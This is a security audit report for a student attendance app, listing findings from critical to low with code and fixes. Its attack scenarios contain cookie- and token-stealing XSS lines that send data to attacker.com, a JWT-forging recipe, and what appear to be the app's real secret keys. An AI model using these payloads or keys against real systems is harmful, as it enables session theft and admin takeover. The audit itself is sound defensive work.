# SSAAM Security Report
**Prepared by:** Senior Web Application Security Analyst  
**Date:** May 16, 2026  
**Scope:** Full-stack audit — Express.js backend, Vue 3 frontend, MongoDB Atlas, Cloudinary, deployment configuration  
**Status:** ANALYSIS ONLY — No fixes applied. Awaiting approval.

---

## Table of Contents
1. [CRITICAL Issues](#critical-issues)
2. [HIGH Issues](#high-issues)
3. [MEDIUM Issues](#medium-issues)
4. [LOW Issues](#low-issues)

---

## CRITICAL Issues

---

### C-01 · Hardcoded AES Encryption Key Exposed in Frontend Bundle

**Severity:** CRITICAL  
**File:** `src/services/apiService.js` line 18 AND `SSAAM_VERCEL_BACKEND.js` line 14

**Vulnerable Code:**
```js
// src/services/apiService.js
const _EK = 'SSAAM_JRMSU_2026_CCS_KEY_v2_32!!'

// SSAAM_VERCEL_BACKEND.js
const _EK = Buffer.from('SSAAM_JRMSU_2026_CCS_KEY_v2_32!!');
```

**Why it is dangerous:**  
The AES-256-CBC key used to encrypt all API responses is baked into the compiled JavaScript bundle that every browser downloads. Anyone who opens DevTools → Sources can find it in seconds. The encryption becomes completely worthless — an attacker can decrypt every "encrypted" response from the server as if there were no encryption at all.

**Real-world attack scenario:**  
1. Attacker opens the app and presses F12 → Sources → searches `_EK`.  
2. Finds the key `SSAAM_JRMSU_2026_CCS_KEY_v2_32!!`.  
3. Writes a 10-line script to decrypt any intercepted API payload.  
4. Every student record, attendance log, financial record, and face descriptor is now readable in plain text.

**Recommended fix:**  
The payload encryption scheme is fundamentally broken when the same key lives in the browser. Either:  
- Remove payload encryption entirely and rely on HTTPS (already present) for transport security — this is the standard, correct approach; OR  
- If you must encrypt response payloads, use a per-session key negotiated via Diffie-Hellman — this requires significant architecture change.

**Estimated impact of fixing:** High — removes false sense of security; HTTPS is sufficient.  
**May break existing functionality:** Yes — the client-side `_decrypt()` function in `apiService.js` must be removed in sync with the server-side `encryptPayload()`.

---

### C-02 · Unauthenticated File Upload Endpoint

**Severity:** CRITICAL  
**File:** `SSAAM_VERCEL_BACKEND.js` line 4098

**Vulnerable Code:**
```js
app.post('/apis/upload-image', async (req, res) => {
    // No auth middleware — no `auth`, no `studentAuth`, nothing
    try {
        const { image } = req.body;
        // directly uploads to Cloudinary
```

**Why it is dangerous:**  
Any person on the internet — with no account, no token, no authentication whatsoever — can `POST` to `/apis/upload-image` with a base64 string and upload arbitrary files to your Cloudinary account. This can lead to: (1) exhaustion of your Cloudinary storage/bandwidth quota, (2) hosting of malicious content on your CDN, (3) financial cost from bandwidth usage.

**Real-world attack scenario:**  
An automated script sends thousands of POST requests to `/apis/upload-image` each containing a large base64 image. Within minutes your Cloudinary plan quota is exhausted. The CDN now serves attacker-chosen images under your account's domain.

**Recommended fix:**  
Add `auth` or `studentAuthWithToken` middleware to this route:
```js
app.post('/apis/upload-image', auth, async (req, res) => {
```

**Estimated impact of fixing:** High — closes a wide-open abuse vector.  
**May break existing functionality:** Only if any code calls this endpoint without a valid auth token (which it should not be doing anyway).

---

### C-03 · Predictable Client-Side Admin Verification Code

**Severity:** CRITICAL  
**File:** `src/pages/Login.vue` (admin 2nd verification step)

**Vulnerable Code:**
```js
// Computed entirely in the browser
const correctCode = `${month}${day}${year}`; // e.g., "051626"
if (enteredCode === correctCode) {
    proceedToFaceVerification()
}
```

**Why it is dangerous:**  
The "second factor" for admin login is the current date formatted as MMDDYY. This is not a secret — it changes every day, but is trivially computable by anyone who can read the source code or knows the date. No server round-trip is made to validate it; the check is entirely in the browser's JavaScript. Any attacker can bypass admin 2FA by simply calculating today's date code.

**Real-world attack scenario:**  
1. Attacker obtains (or guesses) an admin username/password (e.g., via credential stuffing).  
2. App shows the "enter 2nd verification code" prompt.  
3. Attacker opens the browser console, types `new Date()`, calculates today's MMDDYY, enters it.  
4. Full admin access granted — no token, no SMS, no TOTP needed.

**Recommended fix:**  
Replace with a server-generated TOTP or time-based code that is verified server-side. At minimum, the code should be generated server-side and validated server-side, never computed in the browser.

**Estimated impact of fixing:** Critical — current 2FA provides zero real protection.  
**May break existing functionality:** Yes — requires changes to both frontend and a new backend endpoint.

---

### C-04 · Critical npm Dependency Vulnerability (jsPDF)

**Severity:** CRITICAL  
**File:** `package.json` (via `html2pdf.js` → `jspdf`)

**Vulnerability:** `jspdf` has multiple critical CVEs including:
- PDF Injection allowing Arbitrary JavaScript Execution via AcroFormChoiceField
- PDF Object Injection via `addJS` method
- PDF Injection in AcroForm RadioButton
- HTML Injection in New Window paths
- Client-side DoS via malicious GIF/BMP dimensions

**Why it is dangerous:**  
If student-supplied data (names, IDs, descriptions) is passed into PDF generation without sanitization, an attacker can inject JavaScript that executes when the PDF is opened. Additionally, the DoS vectors can crash the user's browser tab.

**Real-world attack scenario:**  
A student sets their name to a specially crafted PDF injection string. When an admin exports the attendance report to PDF, opening it in Adobe Reader triggers the embedded JavaScript payload.

**Recommended fix:**  
```bash
npm audit fix
```
If a patched version is not available, sanitize all inputs before passing to `html2pdf.js`, and consider replacing with a server-side PDF library.

**Estimated impact of fixing:** High — protects admins from malicious PDF payloads.  
**May break existing functionality:** Unlikely — input sanitization is additive.

---

## HIGH Issues

---

### H-01 · CORS Allows ALL HTTP Origins (isLocalhost Logic Bug)

**Severity:** HIGH  
**File:** `SSAAM_VERCEL_BACKEND.js` lines 87–90

**Vulnerable Code:**
```js
const isLocalhost = (origin) => {
    if (!origin) return false;
    return origin.startsWith('http://') || origin.startsWith('http://127.0.0.1');
};
```

**Why it is dangerous:**  
`origin.startsWith('http://')` matches **every HTTP URL in the world**, not just localhost. Any website served over HTTP (e.g., `http://attacker.com`) will pass this check and receive a successful CORS response with `credentials: true`. This means a malicious website can make cross-origin authenticated requests to your API using the victim's cookies/credentials.

**Real-world attack scenario:**  
1. Attacker hosts `http://evil.com/steal.html`.  
2. Victim (logged-in admin) visits that page.  
3. Page runs `fetch('https://your-backend/apis/students', { credentials: 'include' })`.  
4. CORS check passes (`http://evil.com` starts with `http://`).  
5. Attacker receives full student data with admin auth.

**Recommended fix:**  
```js
const isLocalhost = (origin) => {
    if (!origin) return false;
    return origin === 'http://localhost:5000' 
        || origin === 'http://127.0.0.1:5000'
        || origin === 'http://localhost:3001';
};
```

**Estimated impact of fixing:** High — closes a broad CSRF/data-theft vector.  
**May break existing functionality:** Only local development if non-standard ports are used; easily enumerated.

---

### H-02 · JWT Signed with Weak, Known Static Key

**Severity:** HIGH  
**File:** `SSAAM_VERCEL_BACKEND.js` line 373, `.replit` / env vars

**Vulnerable Code:**
```js
const SSAAM_API_KEY = process.env.SSAAM_API_KEY; // = "SSAAMRegJRMSU"
// ...
jwt.sign({ ... }, SSAAM_API_KEY)
jwt.verify(token, SSAAM_API_KEY)
```

**Why it is dangerous:**  
The JWT secret is `SSAAMRegJRMSU` — a short, predictable string stored as a plain environment variable and visible in `.replit`. Because this key is weak and potentially visible in version control or Replit's config file, an attacker who learns it can forge any JWT, including admin tokens with `isMaster: true` and `role: 'admin'`.

**Real-world attack scenario:**  
1. Attacker reads `SSAAM_API_KEY=SSAAMRegJRMSU` from the Replit env config or a leaked `.replit` file.  
2. Forges a JWT: `jwt.sign({ isMaster: true, role: 'admin', college: 'CCS' }, 'SSAAMRegJRMSU')`.  
3. Uses forged token in `Authorization: Bearer <token>`.  
4. Full admin access without knowing any credentials.

**Recommended fix:**  
Replace with a cryptographically random 64-byte secret stored only in Replit Secrets:
```bash
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```
Store the output as `SSAAM_JWT_SECRET` in Replit Secrets (not in `.replit`).

**Estimated impact of fixing:** Very high — fundamentally strengthens all authentication.  
**May break existing functionality:** All existing JWT tokens will be invalidated (all users must re-login). Plan accordingly.

---

### H-03 · JWT Accepted via Query Parameter (Token Leakage)

**Severity:** HIGH  
**File:** `SSAAM_VERCEL_BACKEND.js` lines 310–311

**Vulnerable Code:**
```js
// Query param
if (req.query && req.query.token) return req.query.token;
```

**Why it is dangerous:**  
Tokens in URLs are logged by web servers, proxies, CDNs, browser history, and Referrer headers. A student sharing a link, a server log being read by the wrong person, or a browser extension can silently capture the auth token.

**Real-world attack scenario:**  
Admin calls an endpoint like `GET /apis/students?token=eyJ...`. The full URL (with token) appears in Nginx access logs, Cloudflare logs, and the browser's address bar. A sysadmin or log analysis tool inadvertently exposes all active session tokens.

**Recommended fix:**  
Remove the query parameter fallback entirely. Tokens should only be accepted via the `Authorization: Bearer` header.

**Estimated impact of fixing:** Medium-high.  
**May break existing functionality:** Only if any code currently passes tokens as query params (audit frontend to confirm).

---

### H-04 · `studentAuth` Uses Static Bearer Token as Authentication

**Severity:** HIGH  
**File:** `SSAAM_VERCEL_BACKEND.js` lines 2988–2997

**Vulnerable Code:**
```js
function studentAuth(req, res, next) {
    const token = extractToken(req);
    const validStudentKey = process.env.SSAAM_STUDENT_API_KEY || 'SSAAMStudents';
    if (!token || token !== validStudentKey) {
        return res.status(401).json({ message: "Unauthorized: Invalid key" });
    }
    next();
}
```

**Why it is dangerous:**  
This "auth" middleware is a single shared static password (`SSAAMStudents`) that every student uses. It is exposed in the frontend via `VITE_SSAAM_STUDENTS_API_KEY=SSAAMStudents`. Anyone who uses the app can find this key in the browser's network tab or JS bundle and call any `studentAuth`-protected route as any student, with no identity check whatsoever.

**Real-world attack scenario:**  
Student opens DevTools, sees `Authorization: Bearer SSAAMStudents` in a request. They now have the key to access all `studentAuth`-protected endpoints as any student — reading other students' data, modifying their own records, etc.

**Recommended fix:**  
Replace `studentAuth` with `studentAuthWithToken` on all routes, which validates a real per-user JWT. Audit every route using `studentAuth` and upgrade each one.

**Estimated impact of fixing:** Very high — closes a broad authorization bypass.  
**May break existing functionality:** Yes — requires all student endpoints that use `studentAuth` to be updated to use proper JWT auth.

---

### H-05 · Hardcoded Cryptographic Key in Frontend (ssaamCrypto.js)

**Severity:** HIGH  
**File:** `src/utils/ssaamCrypto.js` line 1, `SSAAM_VERCEL_BACKEND.js` line 702

**Vulnerable Code:**
```js
// Frontend
const SSAAM_KEY = "SSAAM2025CCS";

// Backend (also hardcoded as fallback)
const KNOWN_CRYPTO_KEYS = ['SSAAM2025CCS'];
```

**Why it is dangerous:**  
The XOR key used for timestamp-based anti-bot tokens is hardcoded in the frontend and backend. Any attacker can read it, generate valid `X-SSAAM-TS` tokens at will, and bypass all timestamp-based anti-bot and anti-replay protections.

**Recommended fix:**  
The timestamp token should be validated using the server-side `SSAAM_CRYPTO_KEY` environment variable only. Remove `KNOWN_CRYPTO_KEYS` hardcoded fallbacks. The frontend should stop generating its own tokens and instead receive a server-issued challenge.

**Estimated impact of fixing:** Medium — reduces replay attack surface.  
**May break existing functionality:** Yes — registration flow depends on this token generation.

---

### H-06 · HIGH npm Dependency Vulnerabilities

**Severity:** HIGH  
**File:** `package.json`

**Affected packages:**
- `path-to-regexp` — ReDoS via sequential optional groups and multiple wildcards (used by Express 5)
- `xlsx` — Prototype Pollution, ReDoS
- `rollup` — Arbitrary File Write via Path Traversal (dev dependency)
- `picomatch` — Method Injection via POSIX Character Classes, ReDoS

**Why it is dangerous:**  
- `path-to-regexp` ReDoS: a carefully crafted route URL can hang the Express server, causing denial of service.
- `xlsx` Prototype Pollution: malicious spreadsheet data could corrupt the Node.js runtime prototype chain.

**Recommended fix:**
```bash
npm audit fix
npm audit fix --force  # for breaking changes, review carefully
```

**Estimated impact of fixing:** Medium — mostly DoS vectors in the current threat model.  
**May break existing functionality:** Possibly — `--force` may introduce breaking API changes.

---

## MEDIUM Issues

---

### M-01 · XSS via v-html in Dashboard.vue

**Severity:** MEDIUM  
**File:** `src/pages/Dashboard.vue` lines 4973, 5103

**Vulnerable Code:**
```html
<span v-html="point"></span>
```

**Why it is dangerous:**  
Vue's `v-html` renders raw HTML without escaping. If `point` (from `privacySections` or `tcSections`) ever contains a `<script>` tag or event handler (e.g., from a database-stored value), it executes in every user's browser. This enables stored XSS — one compromise poisons all users.

**Real-world attack scenario:**  
An admin with database write access (or a successful injection attack) sets a privacy section `point` to `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`. Every user who opens the Dashboard sends their cookies to the attacker.

**Recommended fix:**  
Replace `v-html` with `{{ point }}` (text interpolation) unless actual HTML rendering is required. If rich text is needed, sanitize with DOMPurify first:
```js
import DOMPurify from 'dompurify'
// then: v-html="DOMPurify.sanitize(point)"
```

**Estimated impact of fixing:** High if exploitation occurs.  
**May break existing functionality:** Minor — only if the text intentionally contains HTML formatting.

---

### M-02 · JWT and User Data Stored in localStorage (XSS Accessible)

**Severity:** MEDIUM  
**File:** `src/pages/Login.vue`, `src/services/apiService.js`, `src/utils/tokenHandler.js`

**Vulnerable Code:**
```js
localStorage.setItem('authToken', token)
localStorage.setItem('currentUser', JSON.stringify(user))
// Also: 'userLikeId', 'ssaam_server_offset', 'loginChosenDepartment', etc.
```

**Why it is dangerous:**  
`localStorage` is accessible to any JavaScript running on the same origin, including via XSS. If any XSS vulnerability (e.g., M-01 above) is exploited, the attacker can steal the auth token and impersonate the user indefinitely (until the session expires server-side).

**Real-world attack scenario:**  
Exploiting M-01 (v-html XSS), the attacker's script runs `fetch('https://attacker.com/?t='+localStorage.getItem('authToken'))` — the victim's session is instantly stolen.

**Recommended fix:**  
Use `HttpOnly` session cookies instead of localStorage for the JWT. HttpOnly cookies are inaccessible to JavaScript. This requires backend changes to set `Set-Cookie: ssaam_token=...; HttpOnly; Secure; SameSite=Strict`.

**Estimated impact of fixing:** High — eliminates the most common token theft vector.  
**May break existing functionality:** Yes — significant refactor of auth flow required.

---

### M-03 · Unsanitized User Input in Email HTML Templates

**Severity:** MEDIUM  
**File:** `SSAAM_VERCEL_BACKEND.js` lines 611, 634, 648, 686

**Vulnerable Code:**
```js
html: `...
    <h2>Hello ${studentName}!</h2>
    ...
    <strong>${rejectionReason}</strong>
    ...
    <strong>RFID Code:</strong> ${rfidCode}
    <strong>Verified By:</strong> ${verifiedBy}
`
```

**Why it is dangerous:**  
`studentName`, `rejectionReason`, `rfidCode`, and `verifiedBy` are interpolated directly into HTML email templates without escaping. A student who registers with a name containing HTML (e.g., `<script>`) could inject content into emails sent to other users or admins.

**Recommended fix:**  
Apply the existing `sanitizeHtml()` function to all user-supplied values before interpolating them into email HTML:
```js
html: `<h2>Hello ${sanitizeHtml(studentName)}!</h2>`
```

**Estimated impact of fixing:** Low in immediate impact, good hygiene.  
**May break existing functionality:** No.

---

### M-04 · In-Memory Rate Limiters (Non-Persistent, Non-Distributed)

**Severity:** MEDIUM  
**File:** `SSAAM_VERCEL_BACKEND.js` lines 27, 503, 764

**Vulnerable Code:**
```js
const _loginMap = new Map();          // Login attempts
const verificationCodeRateLimiter = { attempts: new Map(), ... };
const registrationAttempts = new Map();
```

**Why it is dangerous:**  
All rate-limiting data lives in Node.js process memory. Every server restart wipes all counters — an attacker can trigger a restart (e.g., via a deployment or process crash) to reset their lockout. In a multi-process or multi-instance deployment, each process has its own counters so limits are effectively divided by the number of processes.

**Recommended fix:**  
Move rate limit state to a persistent store. Options:
- Redis (recommended for production)
- MongoDB with TTL-indexed documents (works with your existing stack)
- The `express-rate-limit` package with `rate-limit-mongo` store

**Estimated impact of fixing:** Medium — adds resilience, especially important at scale.  
**May break existing functionality:** No.

---

### M-05 · Raw Error Messages Exposed in 500 Responses

**Severity:** MEDIUM  
**File:** `SSAAM_VERCEL_BACKEND.js` — widespread pattern

**Vulnerable Code:**
```js
} catch (err) {
    res.status(500).json({ message: err.message });
}
```

**Why it is dangerous:**  
`err.message` from Mongoose or MongoDB often contains collection names, field names, index names, and schema details. This information helps attackers understand your database structure and craft more targeted attacks.

**Real-world attack scenario:**  
Triggering a validation error returns `"students validation failed: student_id: Path 'student_id' is required"` — revealing field names and collection structure.

**Recommended fix:**  
```js
} catch (err) {
    console.error('[API Error]', err); // Log full error server-side
    res.status(500).json({ message: 'An internal server error occurred.' });
}
```

**Estimated impact of fixing:** Medium — removes information leakage.  
**May break existing functionality:** No functional change; improves security posture.

---

### M-06 · Overly Permissive JSON Body Size Limit (10MB)

**Severity:** MEDIUM  
**File:** `SSAAM_VERCEL_BACKEND.js` line 118

**Vulnerable Code:**
```js
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
```

**Why it is dangerous:**  
A 10MB JSON body limit on every route enables a DoS attack — an attacker sends many simultaneous 10MB requests, exhausting server memory and CPU. For routes that don't accept images, this is unnecessarily large.

**Recommended fix:**  
Apply a small limit globally (e.g., `1kb`) and increase it only on routes that accept image data:
```js
app.use(express.json({ limit: '1kb' }));
// Only for the upload route:
app.post('/apis/upload-image', auth, express.json({ limit: '15mb' }), ...)
```

**Estimated impact of fixing:** Medium — reduces DoS attack surface.  
**May break existing functionality:** Must audit all routes to confirm their expected payload sizes.

---

### M-07 · antiBotProtection Bypassed by Custom User-Agent

**Severity:** MEDIUM  
**File:** `SSAAM_VERCEL_BACKEND.js` lines 778–810

**Vulnerable Code:**
```js
const botPatterns = /bot|crawler|spider|scraper|curl|wget|python-requests|postman|insomnia|httpie/i;
if (botPatterns.test(userAgent)) {
    return res.status(403).json({ message: "Forbidden: Automated requests not allowed" });
}
```

**Why it is dangerous:**  
Any attacker can set `User-Agent: Mozilla/5.0 (Windows NT 10.0)` and bypass this check entirely. The protection only stops unsophisticated, unconfigured tools. It provides no real security.

**Recommended fix:**  
Do not rely on User-Agent for security. Combine with proper rate limiting (see M-04), CAPTCHAs for registration, or proof-of-work challenges.

**Estimated impact of fixing:** Low — the protection should be supplemented, not relied upon alone.  
**May break existing functionality:** No.

---

### M-08 · No CSRF Protection Despite `credentials: true` in CORS

**Severity:** MEDIUM  
**File:** `SSAAM_VERCEL_BACKEND.js` line 113

**Context:** CORS config uses `credentials: true`, and the CORS origin check has the `isLocalhost` bug (H-01). Together, these create a CSRF risk — cross-origin requests from certain origins can carry credentials. No CSRF tokens are used on any state-changing route.

**Recommended fix:**  
Add `SameSite=Strict` to session cookies (if you migrate to cookies per M-02) and/or add a CSRF token header verification on all `POST`/`PUT`/`PATCH`/`DELETE` routes. Fix H-01 as a prerequisite.

**Estimated impact of fixing:** Medium — important when combined with H-01 fix.  
**May break existing functionality:** Requires frontend changes to send CSRF tokens.

---

## LOW Issues

---

### L-01 · Sensitive Data Logged to Console

**Severity:** LOW  
**File:** `SSAAM_VERCEL_BACKEND.js` line 470, 476; `src/pages/Login.vue`

**Vulnerable Code:**
```js
// Backend
console.log(`[EmailService] Attempting to send email via ${account.user}`)
console.log("LOGIN SUCCESS:", user) // Frontend
```

**Why it is dangerous:**  
Server logs may be collected by log aggregation tools, forwarded to third parties, or accessed by unauthorized personnel. Email addresses and user objects in logs create a data exposure risk and a compliance concern (FERPA/GDPR for student data).

**Recommended fix:**  
Remove or redact sensitive fields from logs. Use structured logging with a log level system (e.g., `debug` only in development).

---

### L-02 · Public `/apis/health` Endpoint Leaks Server Information

**Severity:** LOW  
**File:** `SSAAM_VERCEL_BACKEND.js` (health endpoint)

**Why it is dangerous:**  
The health endpoint is unauthenticated and returns server timestamps and status information. While low-risk in isolation, it confirms the server is running and may leak version/configuration details.

**Recommended fix:**  
Return a minimal response (e.g., just `{ status: "ok" }`) and remove any server version or config details from the response body.

---

### L-03 · Hardcoded Fallback Admin Username

**Severity:** LOW  
**File:** `SSAAM_VERCEL_BACKEND.js` line 376

**Vulnerable Code:**
```js
const PRIMARY_ADMIN_USERNAME = process.env.PRIMARY_ADMIN_USERNAME || 'ssaam';
```

**Why it is dangerous:**  
The default admin username `ssaam` is predictable. Combined with a weak password policy, this aids brute-force attacks targeting the admin account.

**Recommended fix:**  
Remove the hardcoded fallback. Require `PRIMARY_ADMIN_USERNAME` to be set as an environment variable. Exit or warn loudly if it is not set in production.

---

### L-04 · `vercel.json` Dead Deployment Config Creates Confusion

**Severity:** LOW  
**File:** `vercel.json`

**Why it is dangerous:**  
The project now runs on Replit, but `vercel.json` still exists with Vercel routing rules. This could cause confusion about the deployment target, and if accidentally deployed to Vercel, may expose the backend with different security settings than intended.

**Recommended fix:**  
Delete `vercel.json` and `.env.production` (which points to `https://ssaam-api.vercel.app`) since the app is now fully on Replit.

---

*End of SECURITY_REPORT.md*
